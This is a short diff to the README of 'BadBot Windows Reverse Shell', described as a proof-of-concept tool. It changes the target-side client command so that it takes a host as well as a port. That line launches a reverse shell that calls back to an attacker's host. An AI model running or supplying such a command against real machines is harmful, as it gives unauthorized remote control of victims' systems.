@@ -29,7 +29,7 @@ BadBot Windows Reverse Shell is a proof-of-concept tool designed to demonstrate 
 2. **Client (Target's Side)**
 
     ```bash
-    target > $ ./BadBot-Client.exe [Port]
+    target > $ ./BadBot-Client.exe [Host] [Port]
     ```
 
 ## 🔨 Compilation
